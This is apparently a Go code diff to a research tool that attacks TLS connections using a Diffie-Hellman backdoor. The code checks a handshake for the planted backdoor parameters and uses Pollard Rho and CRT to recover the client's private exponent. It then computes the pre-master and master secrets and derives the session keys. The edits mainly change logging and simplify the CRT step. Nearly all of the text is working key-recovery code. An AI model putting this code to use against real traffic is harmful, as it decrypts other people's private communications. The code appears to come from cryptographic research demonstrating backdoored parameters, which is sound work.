@@ -8,6 +8,8 @@ import(
 	"crypto/sha256"
 	"hash"
 	"math/big"
+
+	"github.com/fatih/color"
 )
 
 // the backdoor parameters
@@ -35,7 +37,8 @@ func equality(a []byte, b []byte) (bool) {
 func backdoored(modulus []byte, generator []byte) (bool) {
 	if len(dh1024_n) == len(modulus) && len(dh1024_g) == len(generator) &&
 		equality(dh1024_n[:], modulus) && equality(dh1024_g[:], generator) {
-		log.Println("backdoor detected!")
+		red := color.New(color.FgRed).SprintFunc()
+		log.Printf(" | %s", red("backdoor detected !!!!!!! <------------"))
 		return true
 	} else {
 		return false
@@ -80,10 +83,10 @@ func get_masterSecret(preMasterSecret []byte, clientRandom []byte, serverRandom 
 
 	// PRF!
 	masterSecret := make([]byte, 48)
-	log.Println(" | preMasterSecret:", preMasterSecret)
+	//log.Println(" | preMasterSecret:", preMasterSecret)
 	pHash(masterSecret, preMasterSecret, seed, sha256.New)
 
-	log.Println(" | masterSecret :", masterSecret)
+	//log.Println(" | masterSecret :", masterSecret)
 	
 	return masterSecret
 }
@@ -138,6 +141,7 @@ func attack(serverPubkey []byte, clientPubkey []byte, serverRandom []byte, clien
 	yq.Mod(y, prime2)
 	
 	// Pollard Rho of each problem
+	/*
 	log.Println("pollard rho!")
 	log.Println("y =", y.String())
 	log.Println("yp =", yp.String())
@@ -145,48 +149,29 @@ func attack(serverPubkey []byte, clientPubkey []byte, serverRandom []byte, clien
 	log.Println("p = ", prime1.String())
 	log.Println("order =", order1.String())
 	log.Println("n = ", modulus.String())
+  */
 	xp := gontl.Pollard_Rho(yp, generator, prime1, order1, gontl.Big0, gontl.Big0)
 	xq := gontl.Pollard_Rho(yq, generator, prime2, order2, gontl.Big0, gontl.Big0)
 
-	// Remove qq=(q-1)/2, use pp=p-1
-	pp := new(big.Int)
-	pp.Sub(prime1, gontl.Big1)
-
-	qq := new(big.Int)
-	qq.Sub(prime2, gontl.Big1)
-
-	rest := new(big.Int)
-	rest.Set(modulus)
-	
-	qq.DivMod(qq, gontl.Big2, rest) // -> rest = 0
-
 	// CRT
-	log.Println("CRT!")
-	x1 := gontl.CRT2(xp, xq, pp, qq)
-	log.Println("found one solution", x1)
-	// second solution
-	
-	plus := new(big.Int)
-	plus.Mul(pp, qq)
-	x2 := new(big.Int)
-	x2.Add(x1, plus)
+	//log.Println("CRT!")
+	x1 := gontl.CRT2(xp, xq, order1, order2)
+	//log.Println("found one solution", x1)
 
 	// Compute the pre-master secret
 	y2 := new(big.Int)
 	y2.SetBytes(clientPubkey)
+	/*
 	log.Println("y2", y2.String())
 	log.Println("x1", x1.String())
 	log.Println("modulus", modulus.String())
-		
-	x1.Exp(y2, x1, modulus) // first solution
-	log.Println("preMasterSecret:", x1)
+  */
 
-	x2.Exp(y2, x2, modulus) // second solution
+	x1.Exp(y2, x1, modulus) // first solution
+	//log.Println(" | preMasterSecret:", x1)
 
 	// Compute the master_secret
-	//masterSecret := get_masterSecret(x1.Bytes(), clientRandom, serverRandom)
-
-	masterSecret := get_masterSecret(x2.Bytes(), clientRandom, serverRandom)
+	masterSecret := get_masterSecret(x1.Bytes(), clientRandom, serverRandom)
 
 	// Derive the keys
 	return get_keys(masterSecret, clientRandom, serverRandom)
